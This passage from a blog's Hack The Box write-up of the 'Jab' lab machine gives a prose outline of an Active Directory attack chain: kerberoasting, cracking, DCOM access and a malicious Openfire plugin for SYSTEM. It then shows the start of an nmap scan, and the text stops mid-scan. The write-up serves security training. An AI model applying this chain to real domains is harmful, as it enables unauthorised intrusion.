<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
<head>
    










    







<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>






    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">

    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    
    <link rel="icon" href=/favicon.png>

    
    





  





  
  
  


<!-- Open Graph image and Twitter Card metadata -->

<title itemprop="name">pL4StiC - HtB Jab</title>
<meta property="og:title" content=pL4StiC&#32;-&#32;HtB&#32;Jab />
<meta name="twitter:title" content=pL4StiC&#32;-&#32;HtB&#32;Jab />
<meta itemprop="name" content=pL4StiC&#32;-&#32;HtB&#32;Jab />
<meta name="application-name" content=pL4StiC&#32;-&#32;HtB&#32;Jab />
<meta property="og:site_name" content="" />


<meta name="description" content="" />
<meta itemprop="description" content="" />
<meta property="og:description" content="" />
<meta name="twitter:description" content="" />


<base href="https://pL4sTiC1337.github.io/writeups/htb-jab/" />
<link rel="canonical" href="https://pL4sTiC1337.github.io/writeups/htb-jab/" itemprop="url" />
<meta name="url" content="https://pL4sTiC1337.github.io/writeups/htb-jab/" />
<meta name="twitter:url" content="https://pL4sTiC1337.github.io/writeups/htb-jab/" />
<meta property="og:url" content="https://pL4sTiC1337.github.io/writeups/htb-jab/" />


<meta property="og:updated_time" content="2025-02-05T16:43:23-05:00" />


<link rel="sitemap" type="application/xml" title="Sitemap" href='https://pL4sTiC1337.github.io/sitemap.xml' />

<meta name="robots" content="index,follow" />
<meta name="googlebot" content="index,follow" />



  
    <meta name="twitter:site" content="@pL4sTiC1337" />
    <meta name="twitter:creator" content="@pL4sTiC1337" />

<meta property="fb:admins" content="" />


<meta name="apple-mobile-web-app-title" content="" />
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="black" />






<meta name="generator" content="Hugo 0.143.1">


    
    

<link type="text/css" rel="stylesheet" href="/css/bundle.min.cca58c146f4edc10af613962d5043d66deb02f90a09c9f14c98adf9418774835.css">


    
    <style>
    body {
        --sidebar-bg-color: #202020;
        --sidebar-img-border-color: #515151;
        --sidebar-p-color: #909090;
        --sidebar-h1-color: #FFF;
        --sidebar-a-color: #FFF;
        --sidebar-socials-color: #FFF;
        --text-color: #222;
        --bkg-color: #FAF9F6;
        --post-title-color: #303030;
        --list-color: #5A5A5A;
        --link-color: #268BD2;
        --date-color: #515151;
        --table-border-color: #E5E5E5;
        --table-stripe-color: #F9F9F9;
        --code-color: #000;
        --code-background-color: #E5E5E5;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
        --moon-sun-color: #FFF;
        --moon-sun-background-color: #515151;
    }
    body.dark-theme {
        --text-color: #EEE;
        --bkg-color: #121212;
        --post-title-color: #DBE2E9;
        --list-color: #9D9D9D;
        --link-color: #268BD2;
        --date-color: #9A9A9A;
        --table-border-color: #515151;
        --table-stripe-color: #202020;
        --code-color: #FFF;
        --code-background-color: #515151;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
    }
    body {
        background-color: var(--bkg-color);
    }
</style>

</head>

    <body class="dark-theme">
        <div class="wrapper">
            <aside class="sidebar">
    <div class="container sidebar-sticky">
        <div class="light-dark" align="right">
    <button class="btn-light-dark" title="Toggle light/dark mode">
        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
        </svg>
        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
        </svg>
    </button>
</div>

        <div class="sidebar-about">
    <h1 class="brand">
        
            <a href="https://pL4sTiC1337.github.io/">
                <img src="/images/pl4stic.png" alt="brand image">
            </a>
        
        
            <a href="https://pL4sTiC1337.github.io/">
                <h1>pL4StiC</h1>
            </a>
        
    </h1>
    <p class="lead">
    My Ramblings...
    </p>
</div>

        <nav>
    <ul class="sidebar-nav">

        
        
        
        
            

            
                
                
                    <li class="heading">
                        <a href="/about/">About</a>
                    </li>
                    
                
            
                
                
            
                
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        
        
            

            
                
                
            
                
                
                    <li class="heading">
                        <a href="/posts/">Posts</a>
                    </li>
                    
                        <li class="sub-heading">
                            Recent
                        </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/posts/dark-side-of-wifi/">The Dark Side of WiFi</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/posts/the-age-of-uts/">The Age of Ubiquitous Surveillance</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/posts/the-rfid-badge-capture/">The RFID Badge Capture</a>
                            </li>
                        
                    
                
            
                
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        
        
            

            
                
                
            
                
                
            
                
                
                    <li class="heading">
                        <a href="/writeups/">Writeups</a>
                    </li>
                    
                        <li class="sub-heading">
                            Recent
                        </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-faculty/">HtB Faculty</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-jab/">HtB Jab</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-hospital/">HtB Hospital</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-active/">HtB Active</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-cozyhosting/">HtB Cozyhosting</a>
                            </li>
                        
                    
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        

    </ul>
</nav>

        
    <a target="_blank" class="social" title="GitHub" href="https://github.com/pL4sTiC1337">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
        </svg>
    </a>





    <a target="_blank" class="social" title="X" href="https://x.com/pL4sTiC1337">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.1em" height="1.1em" viewBox="0 0 512 472.799">
            <path fill="currentColor" d="M403.229 0h78.506L310.219 196.04 512 462.799H354.002L230.261 301.007 88.669 462.799h-78.56l183.455-209.683L0 0h161.999l111.856 147.88L403.229 0zm-27.556 415.805h43.505L138.363 44.527h-46.68l283.99 371.278z"/>
        </svg>
    </a>




    <a target="_blank" class="social" title="TryHackMe" href="https://tryhackme.com/r/p/pL4sTiC">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24" >
            <path fill="white" d="M10.705 0C7.54 0 4.902 2.285 4.349 5.291a4.525 4.525 0 0 0-4.107 4.5 4.525 4.525 0 0 0 4.52 4.52h6.761a.625.625 0 1 0 0-1.25H4.761a3.273 3.273 0 0 1-3.27-3.27A3.273 3.273 0 0 1 6.59 7.08a.625.625 0 0 0 .7-1.035 4.488 4.488 0 0 0-1.68-.69 5.223 5.223 0 0 1 5.096-4.104 5.221 5.221 0 0 1 5.174 4.57 4.489 4.489 0 0 0-.488.305.625.625 0 1 0 .731 1.013 3.245 3.245 0 0 1 1.912-.616 3.278 3.278 0 0 1 3.203 2.61.625.625 0 0 0 1.225-.251 4.533 4.533 0 0 0-4.428-3.61 4.54 4.54 0 0 0-.958.105C16.556 2.328 13.9 0 10.705 0zm5.192 10.64a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.054.514c0 .181.018.353.054.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .309-.296c.08-.124.137-.267.173-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.309-.291.917.917 0 0 0-.46-.108zm6.486 0a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.053.514c0 .181.017.353.053.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .31-.296c.078-.124.136-.267.172-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.308-.291.916.916 0 0 0-.461-.108zm-8.537.068l-.84.618.313.43.476-.368v1.877h.603v-2.557zm6.486 0l-.841.618.314.43.477-.368v1.877h.603v-2.557zm-4.435.445c.08 0 .143.028.193.084.05.057.087.127.114.21.026.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.028.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.248.248 0 0 1-.195-.086.584.584 0 0 1-.118-.209 1.245 1.245 0 0 1-.056-.27 2.645 2.645 0 0 1 0-.533c.01-.096.029-.186.056-.27a.583.583 0 0 1 .118-.209.25.25 0 0 1 .195-.084zm6.486 0c.08 0 .144.028.193.084.05.057.087.127.114.21.027.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.027.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.249.249 0 0 1-.195-.086.581.581 0 0 1-.117-.209 1.245 1.245 0 0 1-.056-.27 2.642 2.642 0 0 1 0-.533c.01-.096.028-.186.056-.27a.58.58 0 0 1 .117-.209.25.25 0 0 1 .195-.084zm-2.191 3.51a.93.93 0 0 0-.463.109.908.908 0 0 0-.312.291c-.08.122-.139.263-.175.426a2.383 2.383 0 0 0-.054.514c0 .18.018.353.054.516.036.164.094.308.175.432a.91.91 0 0 0 .312.296.92.92 0 0 0 .463.11c.18 0 .333-.037.46-.11a.892.892 0 0 0 .308-.296 1.32 1.32 0 0 0 .174-.432c.036-.163.054-.335.054-.516 0-.18-.018-.352-.054-.514a1.274 1.274 0 0 0-.174-.426.89.89 0 0 0-.309-.291.918.918 0 0 0-.46-.108zm-6.402.07l-.841.617.314.43.476-.369v1.878h.604v-2.557zm2.125 0l-.841.617.314.43.477-.369v1.878h.603v-2.557zm2.116 0l-.84.617.313.43.477-.369v1.878h.603v-2.557zm2.16.443c.08 0 .144.028.194.085a.605.605 0 0 1 .114.21c.026.083.044.172.053.269a2.639 2.639 0 0 1 0 .532 1.28 1.28 0 0 1-.053.27.585.585 0 0 1-.114.21.244.244 0 0 1-.193.085.25.25 0 0 1-.196-.085.589.589 0 0 1-.117-.21 1.245 1.245 0 0 1-.056-.27 2.597 2.597 0 0 1 0-.532c.01-.097.028-.186.056-.27a.589.589 0 0 1 .117-.209.249.249 0 0 1 .196-.085zm-6.729 3.073a.676.676 0 0 0-.335.078.661.661 0 0 0-.227.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.93.93 0 0 0 .127.313.65.65 0 0 0 .227.215c.092.053.204.08.335.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .225-.215c.057-.09.1-.194.125-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.931.931 0 0 0-.125-.31.658.658 0 0 0-.225-.21.667.667 0 0 0-.334-.08zm3.086 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.907.907 0 0 0-.127.31 1.69 1.69 0 0 0-.04.373c0 .131.013.256.04.375a.928.928 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.752 1.752 0 0 0 0-.748.94.94 0 0 0-.126-.31.657.657 0 0 0-.224-.21.667.667 0 0 0-.334-.08zm5.108 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.931.931 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08.13 0 .243-.027.334-.08a.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.943.943 0 0 0-.126-.31.657.657 0 0 0-.224-.21.668.668 0 0 0-.334-.08zm-6.658.05l-.61.448.227.311.346-.266v1.362h.438v-1.856zm3.068 0l-.61.448.227.311.346-.266v1.362h.438v-1.856zm5.108 0l-.611.448.228.311.346-.266v1.362h.438v-1.856zm-9.712.322c.058 0 .105.02.14.062a.421.421 0 0 1 .083.151.96.96 0 0 1 .04.196 1.932 1.932 0 0 1 0 .386.954.954 0 0 1-.04.197.421.421 0 0 1-.083.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.427.427 0 0 1-.085-.153.887.887 0 0 1-.041-.197 1.96 1.96 0 0 1 0-.386.893.893 0 0 1 .04-.196.42.42 0 0 1 .086-.151.181.181 0 0 1 .141-.062zm3.086 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.94.94 0 0 1 .04.196 1.906 1.906 0 0 1 0 .386.93.93 0 0 1-.04.197.421.421 0 0 1-.082.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.42.42 0 0 1-.086-.153.846.846 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.849.849 0 0 1 .041-.196.42.42 0 0 1 .086-.151.182.182 0 0 1 .141-.062zm5.108 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.92.92 0 0 1 .04.196 1.963 1.963 0 0 1 0 .386.943.943 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.061.18.18 0 0 1-.142-.06.437.437 0 0 1-.085-.153.95.95 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.959.959 0 0 1 .04-.196.47.47 0 0 1 .086-.151.181.181 0 0 1 .142-.062zm-1.684 1.814a.675.675 0 0 0-.336.079.66.66 0 0 0-.227.21.91.91 0 0 0-.127.31 1.731 1.731 0 0 0 0 .748.939.939 0 0 0 .127.314c.059.09.134.162.227.215.093.053.205.08.336.08a.66.66 0 0 0 .334-.08.648.648 0 0 0 .224-.215c.058-.09.1-.195.126-.314a1.737 1.737 0 0 0-.001-.747.928.928 0 0 0-.125-.31.65.65 0 0 0-.224-.211.668.668 0 0 0-.334-.079zm3.063 0a.676.676 0 0 0-.336.079.664.664 0 0 0-.227.21.906.906 0 0 0-.127.31 1.74 1.74 0 0 0 0 .748.936.936 0 0 0 .127.314.66.66 0 0 0 .227.215c.092.053.204.08.336.08a.654.654 0 0 0 .334-.08.648.648 0 0 0 .223-.215c.058-.09.1-.195.126-.314a1.74 1.74 0 0 0 0-.747.928.928 0 0 0-.126-.31.65.65 0 0 0-.223-.211.666.666 0 0 0-.334-.079zm-1.545.05l-.611.448.228.312.346-.267v1.363h.438v-1.856zm-1.518.323c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.91.91 0 0 1 .04.195 1.966 1.966 0 0 1 0 .387.951.951 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.06.18.18 0 0 1-.142-.06.428.428 0 0 1-.085-.152.914.914 0 0 1-.04-.197 1.96 1.96 0 0 1-.011-.195c0-.058.003-.122.01-.192a.923.923 0 0 1 .041-.195c.02-.06.048-.11.085-.152a.181.181 0 0 1 .142-.061zm3.063 0c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.94.94 0 0 1 .04.195 1.91 1.91 0 0 1 0 .387.93.93 0 0 1-.04.197.422.422 0 0 1-.083.152.175.175 0 0 1-.14.06.18.18 0 0 1-.141-.06.423.423 0 0 1-.085-.152.907.907 0 0 1-.04-.197 1.95 1.95 0 0 1 0-.387.915.915 0 0 1 .04-.195c.02-.06.048-.11.085-.152a.182.182 0 0 1 .142-.061zm-9.713.185a.465.465 0 0 0-.232.055.456.456 0 0 0-.157.146.627.627 0 0 0-.089.215 1.168 1.168 0 0 0-.027.259c0 .09.009.177.027.26a.648.648 0 0 0 .089.216c.04.063.093.112.157.149a.459.459 0 0 0 .232.056c.09 0 .168-.02.231-.056a.45.45 0 0 0 .156-.149.67.67 0 0 0 .087-.217 1.218 1.218 0 0 0 0-.518.647.647 0 0 0-.087-.215.448.448 0 0 0-.156-.146.458.458 0 0 0-.23-.055zm1.052.035l-.423.31.158.217.24-.185v.944h.303v-1.286zm-1.052.224c.04 0 .073.014.097.042a.284.284 0 0 1 .057.105.69.69 0 0 1 .028.136c.004.049.007.092.007.133 0 .04-.003.086-.007.135a.684.684 0 0 1-.028.136.285.285 0 0 1-.057.105.123.123 0 0 1-.097.043.125.125 0 0 1-.098-.043.298.298 0 0 1-.059-.105.612.612 0 0 1-.028-.136 1.39 1.39 0 0 1 0-.268.62.62 0 0 1 .028-.136.297.297 0 0 1 .06-.105.125.125 0 0 1 .097-.042zm3.775 1.394a.463.463 0 0 0-.232.054.452.452 0 0 0-.157.146.621.621 0 0 0-.088.214 1.19 1.19 0 0 0 0 .519.641.641 0 0 0 .088.217.46.46 0 0 0 .157.15.458.458 0 0 0 .232.054.454.454 0 0 0 .232-.055.45.45 0 0 0 .155-.149.664.664 0 0 0 .087-.217 1.189 1.189 0 0 0 0-.519.642.642 0 0 0-.087-.214.446.446 0 0 0-.155-.146.459.459 0 0 0-.232-.054zm1.052.034l-.423.31.158.216.24-.185v.945h.303V22.68zm-1.052.223c.04 0 .073.014.098.043a.3.3 0 0 1 .057.105.643.643 0 0 1 .027.135 1.31 1.31 0 0 1 0 .268.654.654 0 0 1-.027.137.307.307 0 0 1-.057.105.124.124 0 0 1-.098.042.125.125 0 0 1-.098-.042.293.293 0 0 1-.059-.105.618.618 0 0 1-.028-.137 1.364 1.364 0 0 1 0-.268.612.612 0 0 1 .028-.135.287.287 0 0 1 .06-.105.123.123 0 0 1 .097-.043z"></path>
        </svg>
    </a>










    <a target="_blank" class="social" title="RSS Feed" href="/index.xml">
        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 1280.000000 1280.000000">
            <g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentColor">
                <path d="M2295 11929 c-284 -12 -642 -45 -707 -65 -17 -5 -18 -63 -18 -1039 0 -569 4 -1036 8 -1039 5 -3 74 6 153 19 510 86 1168 95 1789 25 1348 -153 2602 -677 3670 -1531 385 -308 820 -744 1126 -1129 842 -1060 1362 -2313 1514 -3650 70 -621 61 -1279 -25 -1789 -13 -79 -22 -148 -19 -153 3 -4 471 -8 1039 -8 l1035 0 5 23 c51 225 85 942 67 1419 -23 605 -77 1044 -198 1617 -294 1400 -927 2734 -1823 3846 -1043 1295 -2364 2259 -3909 2854 -1158 447 -2451 656 -3707 600z"/>
                <path d="M2255 7845 c-269 -25 -620 -81 -667 -106 -17 -9 -18 -55 -18 -899 0 -706 3 -890 13 -890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207 -107 2267 -823 2814 -1902 166 -327 268 -637 330 -1001 38 -227 48 -384 42 -662 -8 -348 -44 -590 -126 -831 -23 -66 -41 -126 -41 -132 0 -10 184 -13 890 -13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782 -59 703 -233 1323 -545 1945 -481 956 -1313 1788 -2270 2268 -620 310 -1239 483 -1940 542 -165 14 -669 10 -840 -5z"/>
                <path d="M2519 3815 c-391 -66 -725 -336 -868 -703 -79 -201 -96 -462 -45 -677 83 -344 338 -641 666 -774 116 -47 205 -69 330 -80 412 -39 811 153 1040 500 193 292 240 648 128 981 -135 403 -492 699 -914 757 -100 14 -241 12 -337 -4z"/>
            </g>
        </svg>
    </a>





        <p class="footnote">
powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
    <br>
    &copy; 2025 . All rights reserved.
</p>

  </div>
</aside>

            <main class="content container">
                <div class="post">
  <div class="info">
  <h1 class="post-title">
    <a href="https://pL4sTiC1337.github.io/writeups/htb-jab/">HtB Jab</a>
  </h1>

  <div class="headline">
    <div>
      
      
      <time datetime=" 2025-02-05T16:43:23-0500" class="post-date">
        February 5, 2025
      </time>
      
      <span> - </span>
      <span class="reading-time">
        
          
        

        <span>13 mins read</span>
      </span>
    </div>

    
    <ul class="tags">
      
      <li class="tag-writeup">
        <a href="https://pL4sTiC1337.github.io/tags/writeup">writeup</a>
      </li>
      
      <li class="tag-hackthebox">
        <a href="https://pL4sTiC1337.github.io/tags/hackthebox">hackthebox</a>
      </li>
      
      <li class="tag-medium">
        <a href="https://pL4sTiC1337.github.io/tags/medium">medium</a>
      </li>
      
      <li class="tag-windows">
        <a href="https://pL4sTiC1337.github.io/tags/windows">windows</a>
      </li>
      
      <li class="tag-active directory">
        <a href="https://pL4sTiC1337.github.io/tags/active-directory">active directory</a>
      </li>
      
    </ul>
    
  </div>

  
  

  
</div>

  <p><img src="/images/Jab.png" alt="Jab">
Jab is a medium-difficulty Windows machine that features an Openfire XMPP server, hosted on a Domain Controller (DC). Public registration on the XMPP server allows the user to register an account. Then, by retrieving a list of all the users on the domain, a kerberoastable account is found, which allows the attacker to crack the retrieved hash for the user&rsquo;s password. By visiting the account&rsquo;s XMPP chat rooms, another account&rsquo;s password is retrieved. This new account has DCOM privileges over the DC, thus granting the attacker local access on the machine. Finally, a malicious plugin uploaded through the locally-hosted Openfire Administration Panel gives the user SYSTEM access.</p>
<hr>
<h2 id="scanning">Scanning</h2>
<h3 id="nmap">nmap</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿shattersec<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/jab<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nmap -T4 -p- -A -v 10.129.230.215
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2025-02-05 18:14:29Z<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: jab.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.jab.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.jab.htb
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>jab-DC01-CA
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha1WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2023-11-01T20:16:18
</span></span><span style="display:flex;"><span>| Not valid after:  2024-10-31T20:16:18
</span></span><span style="display:flex;"><span>| MD5:   40f9:01d6:610b:2892:43ca:77de:c48d:f221
</span></span><span style="display:flex;"><span>|_SHA-1: 66ea:c22b:e584:ab5e:07e3:aa8f:5af2:b634:0733:8c06
</span></span><span style="display:flex;"><span>|_ssl-date: 2025-02-05T18:15:55+00:00; +1m41s from scanner time.
</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: jab.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssl-date: 2025-02-05T18:15:55+00:00; +1m41s from scanner time.
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.jab.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.jab.htb
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>jab-DC01-CA
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha1WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2023-11-01T20:16:18
</span></span><span style="display:flex;"><span>| Not valid after:  2024-10-31T20:16:18
</span></span><span style="display:flex;"><span>| MD5:   40f9:01d6:610b:2892:43ca:77de:c48d:f221
</span></span><span style="display:flex;"><span>|_SHA-1: 66ea:c22b:e584:ab5e:07e3:aa8f:5af2:b634:0733:8c06
</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: jab.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC01.jab.htb
